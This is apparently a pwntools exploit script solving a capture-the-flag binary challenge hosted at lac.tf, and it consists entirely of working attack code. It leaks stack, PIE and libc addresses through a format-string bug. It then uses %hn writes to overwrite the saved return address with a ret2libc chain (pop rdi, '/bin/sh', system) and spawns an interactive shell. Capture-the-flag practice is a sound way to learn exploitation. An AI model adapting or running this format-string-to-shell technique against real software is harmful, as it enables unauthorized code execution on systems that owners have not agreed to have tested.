#!/usr/bin/env python3

from pwn import *

elf = ELF("./rut_roh_relro_patched",checksec=False)
libc = ELF("./libc-2.31.so",checksec = False)
#ld = ELF("./ld-2.31.so")

context.binary = elf

def make_payload(addr_value, pos=36, leak_pos=None):

    sorted_value = sorted(addr_value.items(), key=lambda x:x[1])
    sorted_dict = dict(sorted_value)

    payload = b""
    bytes_print = 0
    for key in sorted_dict:
        needed_value = sorted_dict[key] - bytes_print
        if needed_value > 0:
            payload += f"%{needed_value}c%{pos}$hn".encode()            
        else:
            payload +=  f"%{pos}$hn".encode()
        pos += 1
        bytes_print = sorted_dict[key]
    if leak_pos:
        for leak in leak_pos:
            payload += f"%{leak}$p".encode()
    print("Len: ",len(payload))
    payload = payload.ljust(240,b"a")

    for key in sorted_dict:
        payload += p64(key)

    assert(len(payload) < 512)
    return payload

#p = elf.process()
p = remote('lac.tf', 31134)
# gdb.attach(p,'b *main+156\n')
# sleep(2)
payload = b"%68$p,%70$p,%71$p"
p.sendline(payload)
p.recvuntil(b"Here's your latest post:\n")
leak = p.recvline().strip()

stack_leak = int(leak.split(b",")[0][2:],16)
pie_leak = int(leak.split(b",")[1][2:],16)
libc_leak = int(leak.split(b",")[2][2:],16)

libc.address = libc_leak - 234 - libc.sym.__libc_start_main
elf.address = pie_leak - elf.sym.__libc_csu_init
ret_addr = stack_leak - 0xe8
input_begin = stack_leak - 0x2f0 + 0x150
pop_rdi = elf.address + 0x127b
system = libc.sym.system
bin_sh = next(libc.search(b"/bin/sh\x00"))
ret = elf.address + 0x1016
log.info(f"Libc base 0x{libc.address:02x}")
log.info(f"system 0x{libc.sym.system:02x}")
log.info(f"Binary base 0x{elf.address:02x}")
log.info(f"input_begin 0x{input_begin:02x}")
log.info(f"ret_addr 0x{ret_addr:02x}")

val_a_0 = system & 0xffff
# val_a_1 = (system >> (1*8)) & 0xff
val_a_2 = (system >> (2*8)) & 0xffff
# val_a_3 = (system >> (3*8)) & 0xff
val_a_4 = (system >> (4*8)) & 0xffff
# val_a_5 = (system >> (5*8)) & 0xff
val_a_6 = (system >> (6*8)) & 0xfff
# val_a_7 = (system >> (7*8)) & 0xff

val_b_0 = pop_rdi & 0xffff
#val_b_1 = (pop_rdi >> (1*8)) & 0xff
val_b_2 = (pop_rdi >> (2*8)) & 0xffff
#val_b_3 = (pop_rdi >> (3*8)) & 0xff
val_b_4 = (pop_rdi >> (4*8)) & 0xffff
#val_b_5 = (pop_rdi >> (5*8)) & 0xff
val_b_6 = (pop_rdi >> (6*8)) & 0xffff
#val_b_7 = (pop_rdi >> (7*8)) & 0xff

val_c_0 = bin_sh & 0xffff
#val_c_1 = (input_begin >> (1*8)) & 0xff
val_c_2 = (bin_sh >> (2*8)) & 0xffff
#val_c_3 = (input_begin >> (3*8)) & 0xff
val_c_4 = (bin_sh >> (4*8)) & 0xffff
#val_c_5 = (input_begin >> (5*8)) & 0xff
val_c_6 = (bin_sh >> (6*8)) & 0xffff
#val_c_7 = (input_begin >> (7*8)) & 0xff

val_d_0 = ret & 0xffff
#val_d_1 = (ret >> (1*8)) & 0xff
val_d_2 = (ret >> (2*8)) & 0xffff
#val_d_3 = (ret >> (3*8)) & 0xff
val_d_4 = (ret >> (4*8)) & 0xffff
#val_d_5 = (ret >> (5*8)) & 0xff
val_d_6 = (ret >> (6*8)) & 0xffff
#val_d_7 = (ret >> (7*8)) & 0xff

a_addr = ret_addr + 0x10 #0x18
#d_addr = ret_addr + 0x10
b_addr = ret_addr
c_addr = ret_addr + 0x08

fmt = {
      a_addr+0:val_a_0,
      #a_addr+1:val_a_1,   
      a_addr+2:val_a_2,
      #a_addr+3:val_a_3,  
      a_addr+4:val_a_4,  
      #a_addr+5:val_a_5,  
      a_addr+6:val_a_6,  
      #a_addr+7:val_a_7,  



      b_addr+0:val_b_0,
      #b_addr+1:val_b_1,
      b_addr+2:val_b_2,
      #b_addr+3:val_b_3,
      b_addr+4:val_b_4,
      #b_addr+5:val_b_5,
      b_addr+6:val_b_6,
      #b_addr+7:val_b_7,

      c_addr+0:val_c_0,
      #c_addr+1:val_c_1,
      c_addr+2:val_c_2,
      #c_addr+3:val_c_3,
      c_addr+4:val_c_4,
      #c_addr+5:val_c_5,
      c_addr+6:val_c_6,
      #c_addr+7:val_c_7,

      # d_addr+0:val_d_0,
      # #d_addr+1:val_d_1,
      # d_addr+2:val_d_2,
      # #d_addr+3:val_d_3,
      # d_addr+4:val_d_4,
      # #d_addr+5:val_d_5,
      # d_addr+6:val_d_6,
      # #d_addr+7:val_d_7,


}
payload = make_payload(fmt) 
#payload += b"/sh\x00"
p.sendline(payload)
# log.info(f"Libc base 0x{libc.address:02x}")
# log.info(f"system 0x{libc.sym.system:02x}")
# log.info(f"printf 0x{libc.sym.printf:02x}")
# log.info(f"setbuf 0x{libc.sym.setbuf:02x}")

# p.sendline(make_payload(fmt))
#p.sendline("/bin/sh\x00;")
p.recv()
p.interactive()
